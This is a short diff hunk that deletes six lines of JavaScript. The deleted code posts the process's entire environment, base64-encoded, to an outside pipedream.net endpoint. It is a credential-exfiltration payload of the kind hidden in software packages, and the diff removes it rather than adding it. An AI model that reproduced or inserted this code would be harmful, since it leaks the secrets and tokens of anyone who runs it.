@@ -1,6 +1,0 @@
-req = http.request({
-  host: '1f0105457be130f460b3cb99161fa29b.m.pipedream.net',
-  path: '/',
-  method: 'POST'
-})
-req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'))
